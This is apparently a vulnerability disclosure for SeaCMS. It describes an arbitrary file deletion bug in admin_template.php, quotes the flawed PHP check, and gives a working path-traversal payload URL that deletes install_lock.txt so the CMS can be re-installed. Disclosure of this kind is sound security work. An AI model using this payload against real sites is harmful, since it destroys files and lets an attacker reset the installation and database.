# Seacms admin_template.php has any file deletion

The code vulnerability is located on line 114 of admin_template.php and does not verify the suffix of deleted files, resulting in the deletion of arbitrary files

```php
elseif($action=='del')
{
	if($filedir == '')
	{
		ShowMsg('未指定要删除的文件或文件名不合法', '-1');
		exit();
	}
	if(substr(strtolower($filedir),0,11)!=$dirTemplate){
		ShowMsg("只允许删除templets目录内的文件！","admin_template.php");
		exit;
	}
	$folder=substr($filedir,0,strrpos($filedir,'/'));
	if(!is_dir($folder)){
		ShowMsg("目录不存在！","admin_template.php");
		exit;
	}
	unlink($filedir);
	ShowMsg("操作成功！","admin_template.php?path=".$folder);
	exit;
}
```

Vulnerability recurrence

payload

```
http://127.0.0.1/seacms/sdfhk/admin_template.php?action=del&filedir=../templets/1.html/../../install/install_lock.txt
```

![image-20240401222830025](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222830025.png)

![image-20240401222833887](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222833887.png)

Looking at the file, you can see that install_lock.txt has been deleted, and the installation file has been deleted so that the database can be re-installed.

![image-20240401222918135](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222918135.png)
